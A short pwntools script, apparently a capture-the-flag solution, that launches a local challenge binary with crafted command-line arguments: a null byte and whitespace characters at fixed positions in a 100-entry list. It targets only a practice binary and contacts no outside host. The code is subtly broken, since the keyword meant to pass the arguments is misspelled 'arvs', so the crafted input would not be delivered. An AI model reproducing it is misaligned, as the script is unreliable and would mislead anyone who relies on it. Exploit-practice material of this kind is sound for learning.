from pwn import *

context.log_level = 'debug'

argvs = ["" for i in range(100)]
argvs[0] = "./input"
argvs[65] = "\x00"
argvs[66] = "\x20\x0a\x0d"

target = process(executable='/home/input2/input', arvs=argvs)

target.interactive()


